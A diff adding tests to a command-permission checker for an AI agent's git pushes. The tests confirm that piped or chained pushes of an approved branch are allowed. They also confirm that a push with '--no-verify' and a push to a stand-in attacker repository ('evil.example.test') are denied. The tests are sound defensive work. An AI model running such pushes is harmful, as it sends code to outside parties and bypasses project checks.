@@ -354,6 +354,19 @@ describe('the git boundary (module check 4)', () => {
     expect(auto(command).decision).toBe('deny');
   });
 
+  it.each([
+    'git push origin agentic/AUT-6820 2>&1 | tail -5',
+    'git push -u origin agentic/AUT-6820 | head -20',
+    'git status && git push origin agentic/AUT-6820',
+  ])('reads a pipe or a list as segments, not as one push argv: %s (backlog 488)', (command) => {
+    expect(auto(command).decision).toBe('allow');
+  });
+
+  it('still refuses the bad push inside a pipeline', () => {
+    expect(auto('git push --no-verify origin agentic/x | tail -5').decision).toBe('deny');
+    expect(auto('ls | git push https://evil.example.test/x.git agentic/x').decision).toBe('deny');
+  });
+
   it('still lets the one push it allows run under `timeout`', () => {
     expect(auto('timeout 180 git push -u origin agentic/AUT-6820').decision).toBe('allow');
   });
